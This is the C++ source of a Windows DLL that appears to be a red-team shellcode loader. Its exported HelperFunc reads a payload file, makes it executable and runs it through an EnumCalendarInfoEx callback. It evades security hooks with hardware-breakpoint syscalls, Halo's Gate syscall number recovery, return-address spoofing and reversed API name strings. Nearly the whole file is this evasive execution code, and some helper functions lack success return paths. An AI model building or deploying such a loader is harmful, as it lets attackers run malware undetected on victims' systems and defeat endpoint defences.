#include <iostream>
#include <fstream>
#include "Windows.h"
#include <inttypes.h>
#include "pch.h"



#define SIZEOF(x) sizeof(x) - 1

#pragma region Defines

#define HWSYSCALLS_DEBUG 0
#define UP -32
#define DOWN 32
#define STACK_ARGS_LENGTH 8
#define STACK_ARGS_RSP_OFFSET 0x28
#define X64_PEB_OFFSET 0x60

#pragma endregion

#pragma region Macros

#if HWSYSCALLS_DEBUG == 0
#define DEBUG_PRINT( STR, ... )
#else
#define DEBUG_PRINT( STR, ... ) printf(STR, __VA_ARGS__ ); 
#endif

#pragma endregion

#pragma region Type Defintions

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _RTL_USER_PROCESS_PARAMETERS {
    BYTE           Reserved1[16];
    PVOID          Reserved2[10];
    UNICODE_STRING ImagePathName;
    UNICODE_STRING CommandLine;
} RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;

typedef struct _PEB_LDR_DATA {
    BYTE       Reserved1[8];
    PVOID      Reserved2[3];
    LIST_ENTRY InMemoryOrderModuleList;
} PEB_LDR_DATA, * PPEB_LDR_DATA;

typedef struct _LDR_DATA_TABLE_ENTRY {
    PVOID Reserved1[2];
    LIST_ENTRY InMemoryOrderLinks;
    PVOID Reserved2[2];
    PVOID DllBase;
    PVOID EntryPoint;
    PVOID Reserved3;
    UNICODE_STRING FullDllName;
    BYTE Reserved4[8];
    PVOID Reserved5[3];
    union {
        ULONG CheckSum;
        PVOID Reserved6;
    };
    ULONG TimeDateStamp;
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB {
    BYTE Reserved1[2];
    BYTE BeingDebugged;
    BYTE Reserved2[21];
    PPEB_LDR_DATA LoaderData;
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
    BYTE Reserved3[520];
    PVOID PostProcessInitRoutine;
    BYTE Reserved4[136];
    ULONG SessionId;
} PEB, * PPEB;

typedef BOOL(WINAPI* GetThreadContext_t)(
    _In_ HANDLE hThread,
    _Inout_ LPCONTEXT lpContext
    );

typedef BOOL(WINAPI* SetThreadContext_t)(
    _In_ HANDLE hThread,
    _In_ CONST CONTEXT* lpContext
    );

#pragma endregion

#pragma region Function Declerations

BOOL MaskCompare(const BYTE* pData, const BYTE* bMask, const char* szMask);
DWORD_PTR FindPattern(DWORD_PTR dwAddress, DWORD dwLen, PBYTE bMask, PCHAR szMask);
DWORD_PTR FindInModule(LPCSTR moduleName, PBYTE bMask, PCHAR szMask);
UINT64 GetModuleAddress(LPWSTR sModuleName);
UINT64 GetSymbolAddress(UINT64 moduleBase, const char* functionName);
UINT64 PrepareSyscall(char* functionName);
bool SetMainBreakpoint();
DWORD64 FindSyscallNumber(DWORD64 functionAddress);
DWORD64 FindSyscallReturnAddress(DWORD64 functionAddress, WORD syscallNumber);
LONG HWSyscallExceptionHandler(EXCEPTION_POINTERS* ExceptionInfo);
bool InitHWSyscalls();
bool DeinitHWSyscalls();

#pragma endregion

#pragma region GlobalVariables

PVOID exceptionHandlerHandle;
HANDLE myThread;
HANDLE hNtdll;
UINT64 ntFunctionAddress;
UINT64 k32FunctionAddress;
UINT64 retGadgetAddress;
UINT64 stackArgs[STACK_ARGS_LENGTH];
UINT64 callRegGadgetAddress;
UINT64 callRegGadgetAddressRet;
char callRegGadgetValue;
UINT64 regBackup;

#pragma endregion


#pragma region BinaryPatternMatching





typedef struct _OBJECT_ATTRIBUTES
{
	ULONG           Length;
	HANDLE          RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG           Attributes;
	PVOID           SecurityDescriptor;
	PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;




typedef NTSTATUS(NTAPI* NtAllocateVirtualMemory_t)(
	HANDLE             ProcessHandle,
	PVOID* BaseAddress,
	ULONG              ZeroBits,
	PULONG             RegionSize,
	ULONG              AllocationType,
	ULONG              Protect
	);

typedef NTSTATUS(NTAPI* NtProtectVirtualMemory_t)(
	IN HANDLE               ProcessHandle,
	IN OUT PVOID* BaseAddress,
	IN OUT PULONG           NumberOfBytesToProtect,
	IN ULONG                NewAccessProtection,
	OUT PULONG              OldAccessProtection
	);

typedef struct _IO_STATUS_BLOCK {
	union {
		NTSTATUS Status;
		PVOID    Pointer;
	};
	ULONG_PTR Information;
} IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;

typedef VOID(NTAPI* PIO_APC_ROUTINE)(
	IN PVOID ApcContext,
	IN PIO_STATUS_BLOCK IoStatusBlock,
	IN ULONG Reserved
	);


typedef NTSTATUS(NTAPI* NtReadFile_t)(
	IN    HANDLE           FileHandle,
	IN OPTIONAL HANDLE           Event,
	IN OPTIONAL PIO_APC_ROUTINE  ApcRoutine,
	IN OPTIONAL PVOID            ApcContext,
	OUT    PIO_STATUS_BLOCK IoStatusBlock,
	OUT    PVOID            Buffer,
	IN     ULONG            Length,
	IN OPTIONAL PLARGE_INTEGER   ByteOffset,
	IN OPTIONAL PULONG           Key
	);

typedef NTSTATUS(NTAPI* NtCreateThreadEx_t)(
	OUT PHANDLE hThread,
	IN ACCESS_MASK DesiredAccess,
	IN PVOID ObjectAttributes,
	IN HANDLE ProcessHandle,
	IN PVOID lpStartAddress,
	IN PVOID lpParameter,
	IN ULONG Flags,
	IN SIZE_T StackZeroBits,
	IN SIZE_T SizeOfStackCommit,
	IN SIZE_T SizeOfStackReserve,
	OUT PVOID lpBytesBuffer);

typedef NTSTATUS(NTAPI* NtWriteVirtualMemory)(
	IN HANDLE pHandle,
	IN PVOID baseAddress,
	IN LPCVOID lpBuffer,
	IN SIZE_T nSize,
	OUT SIZE_T* lpNumberOfBytesWritten
	);

typedef NTSTATUS(NTAPI* NtWaitForSingleObject)(
	IN HANDLE Handle,
	IN BOOLEAN Alertable,
	IN PLARGE_INTEGER Timeout
	);

void reverseStr(char* str, int nSize)
{

	// Swap character starting from two
	// corners
	for (int i = 0; i < nSize / 2; i++)
		std::swap(str[i], str[nSize - i - 1]);
	return;
}


char cNtAllocateVirtualMemory[] = "yromeMlautriVetacollAtN";
char cNtCreateThreadEx[] = "xEdaerhTetaerCtN";
char cNtWaitForSingleObject[] = "tcejbOelgniSroFtiaWtN";


char kernelbase[] = "lld.esablenrek";
char getContext[] = "txetnoCdaerhTteG";
char setContext[] = "txetnoCdaerhTteS";

void reverseStr2(char* str, int nSize)
{

    // Swap character starting from two
    // corners
    for (int i = 0; i < nSize / 2; i++)
        std::swap(str[i], str[nSize - i - 1]);
    return;
}

BOOL MaskCompare(const BYTE* pData, const BYTE* bMask, const char* szMask)
{
    for (; *szMask; ++szMask, ++pData, ++bMask)
        if (*szMask == 'x' && *pData != *bMask)
            return FALSE;
    return TRUE;
}

DWORD_PTR FindPattern(DWORD_PTR dwAddress, DWORD dwLen, PBYTE bMask, PCHAR szMask)
{
    for (DWORD i = 0; i < dwLen; i++)
        if (MaskCompare((PBYTE)(dwAddress + i), bMask, szMask))
            return (DWORD_PTR)(dwAddress + i);

    return 0;
}

DWORD_PTR FindInModule(LPCSTR moduleName, PBYTE bMask, PCHAR szMask)
{
    DWORD_PTR dwAddress = 0;
    PIMAGE_DOS_HEADER imageBase = (PIMAGE_DOS_HEADER)GetModuleHandleA(moduleName);

    if (!imageBase)
        return 0;

    DWORD_PTR sectionOffset = (DWORD_PTR)imageBase + imageBase->e_lfanew + sizeof(IMAGE_NT_HEADERS);

    if (!sectionOffset)
        return 0;

    PIMAGE_SECTION_HEADER textSection = (PIMAGE_SECTION_HEADER)(sectionOffset);
    dwAddress = FindPattern((DWORD_PTR)imageBase + textSection->VirtualAddress, textSection->SizeOfRawData, bMask, szMask);
    return dwAddress;
}

#pragma endregion

#pragma region PEBGetProcAddress

UINT64 GetModuleAddress(LPWSTR moduleName) {
    PPEB peb = (PPEB)__readgsqword(X64_PEB_OFFSET);
    LIST_ENTRY* ModuleList = NULL;

    if (!moduleName)
        return 0;

    for (LIST_ENTRY* pListEntry = peb->LoaderData->InMemoryOrderModuleList.Flink;
        pListEntry != &peb->LoaderData->InMemoryOrderModuleList;
        pListEntry = pListEntry->Flink) {

        PLDR_DATA_TABLE_ENTRY pEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

        if (wcsstr(pEntry->FullDllName.Buffer, moduleName)) {
            return (UINT64)pEntry->DllBase;
        }
    }
    return 0;
}

UINT64 GetSymbolAddress(UINT64 moduleBase, const char* functionName) {
    UINT64 functionAddress = 0;
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleBase;

    // Checking that the image is valid PE file.
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return 0;
    }

    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(moduleBase + dosHeader->e_lfanew);

    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        return functionAddress;
    }

    IMAGE_OPTIONAL_HEADER optionalHeader = ntHeaders->OptionalHeader;

    if (optionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress == 0) {
        return functionAddress;
    }

    // Iterating the export directory.
    PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)(moduleBase + optionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD* addresses = (DWORD*)(moduleBase + exportDirectory->AddressOfFunctions);
    WORD* ordinals = (WORD*)(moduleBase + exportDirectory->AddressOfNameOrdinals);
    DWORD* names = (DWORD*)(moduleBase + exportDirectory->AddressOfNames);

    for (DWORD j = 0; j < exportDirectory->NumberOfNames; j++) {
        if (_stricmp((char*)(moduleBase + names[j]), functionName) == 0) {
            functionAddress = moduleBase + addresses[ordinals[j]];
            break;
        }
    }

    return functionAddress;
}

#pragma endregion

#pragma region HalosGate

DWORD64 FindSyscallNumber(DWORD64 functionAddress) {
    // @sektor7 - RED TEAM Operator: Windows Evasion course - https://blog.sektor7.net/#!res/2021/halosgate.md
    WORD syscallNumber = 0;

    for (WORD idx = 1; idx <= 500; idx++) {
        // check neighboring syscall down
        if (*((PBYTE)functionAddress + idx * DOWN) == 0x4c
            && *((PBYTE)functionAddress + 1 + idx * DOWN) == 0x8b
            && *((PBYTE)functionAddress + 2 + idx * DOWN) == 0xd1
            && *((PBYTE)functionAddress + 3 + idx * DOWN) == 0xb8
            && *((PBYTE)functionAddress + 6 + idx * DOWN) == 0x00
            && *((PBYTE)functionAddress + 7 + idx * DOWN) == 0x00) {
            BYTE high = *((PBYTE)functionAddress + 5 + idx * DOWN);
            BYTE low = *((PBYTE)functionAddress + 4 + idx * DOWN);

            syscallNumber = (high << 8) | low - idx;
            break;
        }

        // check neighboring syscall up
        if (*((PBYTE)functionAddress + idx * UP) == 0x4c
            && *((PBYTE)functionAddress + 1 + idx * UP) == 0x8b
            && *((PBYTE)functionAddress + 2 + idx * UP) == 0xd1
            && *((PBYTE)functionAddress + 3 + idx * UP) == 0xb8
            && *((PBYTE)functionAddress + 6 + idx * UP) == 0x00
            && *((PBYTE)functionAddress + 7 + idx * UP) == 0x00) {
            BYTE high = *((PBYTE)functionAddress + 5 + idx * UP);
            BYTE low = *((PBYTE)functionAddress + 4 + idx * UP);

            syscallNumber = (high << 8) | low + idx;
            break;
        }

    }

    if (syscallNumber == 0)

        return syscallNumber;
}

DWORD64 FindSyscallReturnAddress(DWORD64 functionAddress, WORD syscallNumber) {
    // @sektor7 - RED TEAM Operator: Windows Evasion course - https://blog.sektor7.net/#!res/2021/halosgate.md
    DWORD64 syscallReturnAddress = 0;

    for (WORD idx = 1; idx <= 32; idx++) {
        if (*((PBYTE)functionAddress + idx) == 0x0f && *((PBYTE)functionAddress + idx + 1) == 0x05) {
            syscallReturnAddress = (DWORD64)((PBYTE)functionAddress + idx);
            break;
        }
    }

    if (syscallReturnAddress == 0)

        return syscallReturnAddress;
}

#pragma endregion

UINT64 PrepareSyscall(char* functionName) {
    return ntFunctionAddress;
}

bool SetMainBreakpoint() {
    // Dynamically find the GetThreadContext and SetThreadContext functions
    reverseStr2(getContext, SIZEOF(getContext));
    GetThreadContext_t pGetThreadContext = (GetThreadContext_t)GetSymbolAddress(GetModuleAddress((LPWSTR)L"KERN"), getContext);
    reverseStr2(setContext, SIZEOF(setContext));
    SetThreadContext_t pSetThreadContext = (SetThreadContext_t)GetSymbolAddress(GetModuleAddress((LPWSTR)L"KERN"), setContext);

    DWORD old = 0;

    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    // Get current thread context
    pGetThreadContext(myThread, &ctx);

    // Set hardware breakpoint on PrepareSyscall function
    ctx.Dr0 = (UINT64)&PrepareSyscall;
    ctx.Dr7 |= (1 << 0);
    ctx.Dr7 &= ~(1 << 16);
    ctx.Dr7 &= ~(1 << 17);
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    // Apply the modified context to the current thread
    if (!pSetThreadContext(myThread, &ctx)) {
        return false;
    }

    return true;
}

LONG HWSyscallExceptionHandler(EXCEPTION_POINTERS* ExceptionInfo) {
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        if (ExceptionInfo->ContextRecord->Rip == (DWORD64)&PrepareSyscall) {

            // Find the address of the syscall function in ntdll we got as the first argument of the PrepareSyscall function
            ntFunctionAddress = GetSymbolAddress((UINT64)hNtdll, (const char*)(ExceptionInfo->ContextRecord->Rcx));

            // Move breakpoint to the NTAPI function;
            ExceptionInfo->ContextRecord->Dr0 = ntFunctionAddress;
        }
        else if (ExceptionInfo->ContextRecord->Rip == (DWORD64)ntFunctionAddress) {

            // Create a new stack to spoof the kernel32 function address
            // The stack size will be 0x70 which is compatible with the RET_GADGET we found.
            // sub rsp, 70
            ExceptionInfo->ContextRecord->Rsp -= 0x70;
            // mov rsp, REG_GADGET_ADDRESS
            *(PULONG64)(ExceptionInfo->ContextRecord->Rsp) = retGadgetAddress;

            // Copy the stack arguments from the original stack
            for (size_t idx = 0; idx < STACK_ARGS_LENGTH; idx++)
            {
                const size_t offset = idx * STACK_ARGS_LENGTH + STACK_ARGS_RSP_OFFSET;
                *(PULONG64)(ExceptionInfo->ContextRecord->Rsp + offset) = *(PULONG64)(ExceptionInfo->ContextRecord->Rsp + offset + 0x70);
            }

            DWORD64 pFunctionAddress = ExceptionInfo->ContextRecord->Rip;

            char nonHookedSyscallBytes[] = { 0x4C,0x8B,0xD1,0xB8 };
            if (FindPattern(pFunctionAddress, 4, (PBYTE)nonHookedSyscallBytes, (PCHAR)"xxxx")) {
            }
            else {


                WORD syscallNumber = FindSyscallNumber(pFunctionAddress);

                if (syscallNumber == 0) {
                    ExceptionInfo->ContextRecord->Dr0 = callRegGadgetAddressRet;
                    return EXCEPTION_CONTINUE_EXECUTION;
                }

                DWORD64 syscallReturnAddress = FindSyscallReturnAddress(pFunctionAddress, syscallNumber);

                if (syscallReturnAddress == 0) {
                    ExceptionInfo->ContextRecord->Dr0 = callRegGadgetAddressRet;
                    return EXCEPTION_CONTINUE_EXECUTION;
                }

                // mov r10, rcx
                ExceptionInfo->ContextRecord->R10 = ExceptionInfo->ContextRecord->Rcx;
                //mov eax, SSN
                ExceptionInfo->ContextRecord->Rax = syscallNumber;
                //Set RIP to syscall;ret; opcode address
                ExceptionInfo->ContextRecord->Rip = syscallReturnAddress;

            }

            // Move breakpoint back to PrepareSyscall to catch the next invoke
            ExceptionInfo->ContextRecord->Dr0 = (UINT64)&PrepareSyscall;


        }
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

bool FindRetGadget() {
    // Dynamically search for a suitable "ADD RSP,68;RET" gadget in both kernel32 and kernelbase
    retGadgetAddress = FindInModule("kernel32.dll", (PBYTE)"\x48\x83\xC4\x68\xC3", (PCHAR)"xxxxx");
    if (retGadgetAddress != 0) {
        return true;
    }
    else {
        reverseStr2(kernelbase, SIZEOF(kernelbase));
        retGadgetAddress = FindInModule(kernelbase, (PBYTE)"\x48\x83\xC4\x68\xC3", (PCHAR)"xxxxx");
        if (retGadgetAddress != 0) {
            return true;
        }
    }
    return false;
}

bool InitHWSyscalls() {
    myThread = GetCurrentThread();
    hNtdll = (HANDLE)GetModuleAddress((LPWSTR)L"ntd");

    if (!FindRetGadget()) {
        return false;
    }

    // Register exception handler
    exceptionHandlerHandle = AddVectoredExceptionHandler(1, &HWSyscallExceptionHandler);

    if (!exceptionHandlerHandle) {
        return false;
    }

    return SetMainBreakpoint();
}

bool DeinitHWSyscalls() {
    return RemoveVectoredExceptionHandler(exceptionHandlerHandle) != 0;
}




extern "C" __declspec(dllexport)  void WINAPI HelperFunc(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
    OutputDebugStringA("HelperFunc was executed");
    OutputDebugStringA(lpszCmdLine);
    InitHWSyscalls();
    char cNtReadFile[] = "eliFdaeRtN";
    char cNtProtectVirtualMemory[] = "yromeMlautriVtcetorPtN";
    LPVOID payload = NULL;
    HANDLE hFile;
    SIZE_T payload_len;

    hFile = CreateFileA(lpszCmdLine, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return;
    }
    OutputDebugStringA("Opened File!");
    payload_len = GetFileSize(hFile, NULL);
    if (payload_len == 0) {
        return;
    }
    OutputDebugStringA("Got file Size");

    HANDLE hThread = NULL;

    HANDLE hproc = (HANDLE)-1; //handle to current process




    reverseStr(cNtAllocateVirtualMemory, SIZEOF(cNtAllocateVirtualMemory));
    NtAllocateVirtualMemory_t allocvirtualmemory = (NtAllocateVirtualMemory_t)PrepareSyscall((char*)cNtAllocateVirtualMemory);
    allocvirtualmemory(hproc, &payload, 0, (PULONG)&payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    OutputDebugStringA("Alocated memory");

    IO_STATUS_BLOCK ioBlock;
    reverseStr(cNtReadFile, SIZEOF(cNtReadFile));
    NtReadFile_t readfile = (NtReadFile_t)PrepareSyscall((char*)cNtReadFile);
    readfile(hFile, NULL, NULL, NULL, &ioBlock, payload, (DWORD)payload_len, NULL, NULL);

    DWORD oldAccess = PAGE_READWRITE;
    reverseStr(cNtProtectVirtualMemory, SIZEOF(cNtProtectVirtualMemory));
    NtProtectVirtualMemory_t protectmemory = (NtProtectVirtualMemory_t)PrepareSyscall((char*)cNtProtectVirtualMemory);
    protectmemory(hproc, (PVOID*)&payload, (PULONG)&payload_len, PAGE_EXECUTE_READ, &oldAccess);

    ::EnumCalendarInfoEx((CALINFO_ENUMPROCEX)payload, LOCALE_USER_DEFAULT, ENUM_ALL_CALENDARS, CAL_SMONTHNAME1);

    DeinitHWSyscalls();

    Sleep(50000);
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        OutputDebugStringA("DllMain");
        break;
    case DLL_PROCESS_DETACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    }

    return TRUE;
}

